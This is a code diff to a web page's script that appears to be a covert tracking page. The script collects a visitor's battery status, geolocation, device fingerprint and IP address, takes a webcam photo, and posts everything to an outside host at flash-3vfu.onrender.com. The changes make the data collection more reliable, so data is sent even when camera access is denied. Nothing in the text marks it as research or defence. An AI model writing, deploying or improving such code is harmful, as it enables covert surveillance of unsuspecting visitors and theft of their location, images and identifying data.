@@ -13,6 +13,7 @@
             let batteryInfo = {};
             let geoInfo = { latitude: "Unknown", longitude: "Unknown" };
 
+            // Fetch Battery Info
             if (navigator.getBattery) {
                 let battery = await navigator.getBattery();
                 batteryInfo = {
@@ -21,41 +22,26 @@
                 };
             }
 
+            // Fetch Geolocation
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        geoInfo = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude
-                        };
-                    },
-                    (error) => {
-                        console.log("Geolocation access denied");
-                    }
-                );
+                await new Promise((resolve) => {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            geoInfo = {
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude
+                            };
+                            resolve();
+                        },
+                        () => {
+                            console.log("Geolocation access denied");
+                            resolve();
+                        }
+                    );
+                });
             }
 
-            async function capturePhoto() {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    await video.play();
-                    
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    const imageData = canvas.toDataURL('image/png');
-                    sendData(imageData);
-                    stream.getTracks().forEach(track => track.stop());
-                } catch (error) {
-                    console.log("Camera access denied");
-                }
-            }
-
+            // Fetch Device Info
             let deviceInfo = {
                 ip: "Fetching...",
                 userAgent: navigator.userAgent,
@@ -67,26 +53,51 @@
                 plugins: Array.from(navigator.plugins).map(p => p.name).join(", ") || "No Plugins"
             };
 
-            fetch('https://api64.ipify.org?format=json')
+            // Fetch IP Address
+            await fetch('https://api64.ipify.org?format=json')
                 .then(response => response.json())
-                .then(data => {
-                    deviceInfo.ip = data.ip;
-                    capturePhoto();
-                });
+                .then(data => deviceInfo.ip = data.ip)
+                .catch(() => console.log("Failed to fetch IP"));
 
-            function sendData(photo = null) {
-                fetch('https://flash-3vfu.onrender.com/track', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        session: sessionId,
-                        battery: batteryInfo,
-                        geo: geoInfo,
-                        device: deviceInfo,
-                        photo: photo
-                    })
-                });
+            // Capture Photo and Send Data
+            capturePhoto(sessionId, batteryInfo, geoInfo, deviceInfo);
+        }
+
+        async function capturePhoto(sessionId, batteryInfo, geoInfo, deviceInfo) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const imageData = canvas.toDataURL('image/png');
+                stream.getTracks().forEach(track => track.stop());
+
+                sendData(sessionId, batteryInfo, geoInfo, deviceInfo, imageData);
+            } catch (error) {
+                console.log("Camera access denied");
+                sendData(sessionId, batteryInfo, geoInfo, deviceInfo, null);
             }
+        }
+
+        function sendData(sessionId, batteryInfo, geoInfo, deviceInfo, photo = null) {
+            fetch(`https://flash-3vfu.onrender.com/track/${sessionId}`, { // ✅ Now sending data to `/track/<session_id>`
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    battery: batteryInfo,
+                    geo: geoInfo,
+                    device: deviceInfo,
+                    photo: photo
+                })
+            }).then(response => console.log("Data sent successfully"))
+              .catch(error => console.log("Error sending data:", error));
         }
     </script>
 </head>
